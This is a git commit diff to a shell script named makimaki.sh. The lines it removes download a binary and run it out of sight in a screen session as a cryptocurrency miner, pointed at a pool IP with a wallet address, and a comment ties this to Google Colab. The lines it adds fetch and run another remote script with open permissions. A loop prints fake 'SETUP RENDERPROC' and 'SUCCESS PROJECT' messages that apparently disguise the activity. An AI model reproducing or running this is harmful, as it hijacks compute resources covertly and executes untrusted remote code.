e8c8b9d83b0c26d51f234c49d3d4f06217f096ce
renilo <88342640+renilo@users.noreply.github.com>
2022-11-02 15:38:15 +0700

    Update makimaki.sh

--- makimaki.sh
+++ makimaki.sh
@@ -1,17 +1,6 @@
 # /bin/bash
-# Install XRDP
-# Before get xmr coin for free
-# Google Colab
-sudo apt-get install screen -y
-clear
-sleep 1
-sudo wget -q https://github.com/indah38/theta/raw/main/VTM
-clear
-sleep 1
-chmod 700 VTM
-clear
-sleep 1
-screen -dmS Running ./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU -p x -t40
-sleep 1
+wget https://raw.githubusercontent.com/renilo/kuuntul/main/antam.sh
+chmod 777 antam.sh
+screen -dmS Running ./antam.sh
 i=1
 while true; do clear; echo SETUP RENDERPROC $i; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
